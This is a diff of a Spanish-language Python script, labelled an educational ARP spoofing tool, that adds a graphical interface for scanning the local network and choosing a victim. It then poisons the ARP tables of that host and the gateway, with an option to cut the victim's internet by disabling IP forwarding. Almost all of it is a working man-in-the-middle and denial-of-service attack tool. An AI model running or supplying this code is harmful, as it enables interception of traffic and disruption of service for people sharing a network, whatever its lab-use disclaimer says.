@@ -3,70 +3,46 @@
 """
 Herramienta educativa para ARP Spoofing
 Uso exclusivo en laboratorio controlado con fines académicos.
-Autor: Juan Romero Collazos
-Adaptado y corregido por ChatGPT
 """
 
-import argparse
 import os
-import sys
 import platform
 import time
+import threading
+import tkinter as tk
+from tkinter import scrolledtext, messagebox
 from scapy.layers.l2 import ARP, Ether
-from scapy.sendrecv import send, srp
+from scapy.sendrecv import send, srp, sendp
+from scapy.config import conf
 
-# --- Colores para mensajes ---
-R = "\033[91m"
-G = "\033[92m"
-Y = "\033[93m"
-C = "\033[96m"
-B = "\033[94m"
-W = "\033[0m"
+stop_attack = False
+hosts_data = []
 
-def enable_ip_forwarding():
-    """Activa el reenvío de IP para permitir/romper el Internet."""
-    system = platform.system().lower()
-    if "linux" in system:
-        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    elif "darwin" in system:  # macOS
-        os.system("sysctl -w net.inet.ip.forwarding=1")
-    elif "windows" in system:
-        os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f")
-    print(f"{G}[+] IP forwarding habilitado{W}")
+# ----------------- Funciones de red -----------------
+def log(msg):
+    output_area.insert(tk.END, msg + "\n")
+    output_area.see(tk.END)
 
-def disable_ip_forwarding():
-    """Desactiva el reenvío de IP para restaurar Internet."""
-    system = platform.system().lower()
-    if "linux" in system:
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-    elif "darwin" in system:  # macOS
-        os.system("sysctl -w net.inet.ip.forwarding=0")
-    elif "windows" in system:
-        os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 0 /f")
-    print(f"{Y}[-] IP forwarding deshabilitado{W}")
+def get_mac(ip, retries=3):
+    for _ in range(retries):
+        arp_req = ARP(pdst=ip)
+        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+        answered = srp(broadcast / arp_req, timeout=2, verbose=False)[0]
+        if answered:
+            return answered[0][1].hwsrc
+    return None
 
-def get_mac(ip):
-    """Obtiene la dirección MAC de una IP usando ARP request."""
-    arp_req = ARP(pdst=ip)
-    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = broadcast / arp_req
-    answered = srp(packet, timeout=2, verbose=False)[0]
-    if answered:
-        return answered[0][1].hwsrc
-    else:
-        return None
-
-def spoof(target_ip, spoof_ip):
-    """Envía un paquete ARP falso a la víctima."""
-    target_mac = get_mac(target_ip)
-    if not target_mac:
-        print(f"{R}[-] No se pudo obtener la MAC de {target_ip}{W}")
-        return
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    send(packet, verbose=False)
+def spoof(target_ip, spoof_ip, target_mac, spoof_mac):
+    packet = Ether(dst=target_mac) / ARP(
+        op=2,
+        pdst=target_ip,
+        hwdst=target_mac,
+        psrc=spoof_ip,
+        hwsrc=spoof_mac
+    )
+    sendp(packet, verbose=False)
 
 def restore(destination_ip, source_ip):
-    """Restaura las tablas ARP a su estado original."""
     dest_mac = get_mac(destination_ip)
     src_mac = get_mac(source_ip)
     if dest_mac and src_mac:
@@ -74,38 +50,141 @@ def restore(destination_ip, source_ip):
                      psrc=source_ip, hwsrc=src_mac)
         send(packet, count=4, verbose=False)
 
-def main():
-    parser = argparse.ArgumentParser(description="Herramienta educativa de ARP Spoofing")
-    parser.add_argument("-t", "--target", required=True, help="IP de la víctima")
-    parser.add_argument("-g", "--gateway", required=True, help="IP del gateway")
-    parser.add_argument("--no-internet", action="store_true", help="Cortar el Internet de la víctima (no reenviar paquetes)")
-    args = parser.parse_args()
+def enable_ip_forwarding():
+    system = platform.system().lower()
+    if "linux" in system:
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    elif "darwin" in system:
+        os.system("sysctl -w net.inet.ip.forwarding=1")
+    elif "windows" in system:
+        os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters "
+                  "/v IPEnableRouter /t REG_DWORD /d 1 /f")
 
-    target_ip = args.target
-    gateway_ip = args.gateway
-    enable_forward = not args.no_internet
+def disable_ip_forwarding():
+    system = platform.system().lower()
+    if "linux" in system:
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    elif "darwin" in system:
+        os.system("sysctl -w net.inet.ip.forwarding=0")
+    elif "windows" in system:
+        os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters "
+                  "/v IPEnableRouter /t REG_DWORD /d 0 /f")
 
+def detectar_gateway():
     try:
-        if enable_forward:
-            enable_ip_forwarding()
-        else:
-            disable_ip_forwarding()
+        return conf.route.route("0.0.0.0")[2] # type: ignore
+    except Exception:
+        return ""
 
-        print(f"{G}[+] Iniciando ARP spoofing... (Ctrl+C para detener){W}")
-        while True:
-            spoof(target_ip, gateway_ip)
-            spoof(gateway_ip, target_ip)
-            time.sleep(2)
-    except KeyboardInterrupt:
-        print(f"\n{Y}[!] Deteniendo... restaurando red{W}")
-        restore(target_ip, gateway_ip)
-        restore(gateway_ip, target_ip)
-        if enable_forward:
-            disable_ip_forwarding()
-        print(f"{G}[+] Limpieza completada{W}")
+def escanear_red():
+    global hosts_data
+    gateway = detectar_gateway()
+    if not gateway:
+        return []
+    subred = gateway.rsplit('.', 1)[0] + ".1/24"
+    arp_req = ARP(pdst=subred)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    answered = srp(broadcast / arp_req, timeout=2, verbose=False)[0]
+    hosts_data = []
+    for _, received in answered:
+        if received.psrc != gateway:
+            hosts_data.append((received.psrc, received.hwsrc))
+    return hosts_data
 
-if __name__ == "__main__":
-    if platform.system().lower() != "windows" and os.geteuid() != 0: # type: ignore[attr-defined]
-        print("Este script debe ejecutarse como root.")
-        sys.exit(1)
-    main()
+# ----------------- Bucle de ataque -----------------
+def attack_loop(target_ip, target_mac, gateway_ip, gateway_mac, cut_internet):
+    global stop_attack
+    stop_attack = False
+
+    if not cut_internet:
+        enable_ip_forwarding()
+    else:
+        disable_ip_forwarding()
+
+    log(f"[+] Iniciando ARP spoofing contra {target_ip} ({target_mac})")
+
+    while not stop_attack:
+        spoof(target_ip, gateway_ip, target_mac, gateway_mac)
+        spoof(gateway_ip, target_ip, gateway_mac, target_mac)
+        time.sleep(2)
+
+    log("[*] Ataque detenido. Restaurando red...")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    if not cut_internet:
+        disable_ip_forwarding()
+    log("[+] Limpieza completada.")
+
+# ----------------- Funciones GUI -----------------
+def start_attack():
+    selection = hosts_listbox.curselection()
+    if not selection:
+        messagebox.showerror("Error", "Debes seleccionar un dispositivo.")
+        return
+    index = selection[0]
+    target_ip, target_mac = hosts_data[index]
+    gateway_ip = detectar_gateway()
+    gateway_mac = get_mac(gateway_ip)
+    if not gateway_mac:
+        messagebox.showerror("Error", "No se pudo obtener la MAC del gateway.")
+        return
+
+    t = threading.Thread(target=attack_loop,
+                         args=(target_ip, target_mac, gateway_ip, gateway_mac, var_cut_internet.get()),
+                         daemon=True)
+    t.start()
+
+def stop_attack_fn():
+    global stop_attack
+    stop_attack = True
+
+def cargar_hosts():
+    hosts = escanear_red()
+    hosts_listbox.delete(0, tk.END)
+    for ip, mac in hosts:
+        hosts_listbox.insert(tk.END, f"{ip}  |  {mac}")
+    if not hosts:
+        messagebox.showerror("Error", "No se encontraron dispositivos en la red.")
+
+# ----------------- Interfaz -----------------
+root = tk.Tk()
+root.title("Herramienta Educativa ARP Spoofing")
+
+# Frame principal dividido en 2 paneles
+left_frame = tk.Frame(root)
+left_frame.pack(side="left", fill="both", expand=True)
+
+right_frame = tk.Frame(root)
+right_frame.pack(side="right", fill="y")
+
+# Consola de salida
+output_area = scrolledtext.ScrolledText(left_frame, width=60, height=25)
+output_area.pack(fill="both", expand=True, padx=5, pady=5)
+
+# Lista de hosts
+hosts_listbox = tk.Listbox(right_frame, width=40)
+hosts_listbox.pack(padx=5, pady=5, fill="y")
+
+# Botones y opciones
+btn_scan = tk.Button(right_frame, text="Escanear Red", command=cargar_hosts, bg="blue", fg="white")
+btn_scan.pack(pady=5, fill="x")
+
+var_cut_internet = tk.BooleanVar()
+chk_cut = tk.Checkbutton(right_frame, text="Cortar Internet", variable=var_cut_internet)
+chk_cut.pack(pady=5)
+
+btn_start = tk.Button(right_frame, text="Iniciar Ataque", command=start_attack, bg="green", fg="white")
+btn_start.pack(pady=5, fill="x")
+
+btn_stop = tk.Button(right_frame, text="Detener Ataque", command=stop_attack_fn, bg="red", fg="white")
+btn_stop.pack(pady=5, fill="x")
+
+# Centrar ventana
+root.update_idletasks()
+width = root.winfo_width()
+height = root.winfo_height()
+x = (root.winfo_screenwidth() // 2) - (width // 2)
+y = (root.winfo_screenheight() // 2) - (height // 2)
+root.geometry(f"+{x}+{y}")
+
+root.mainloop()
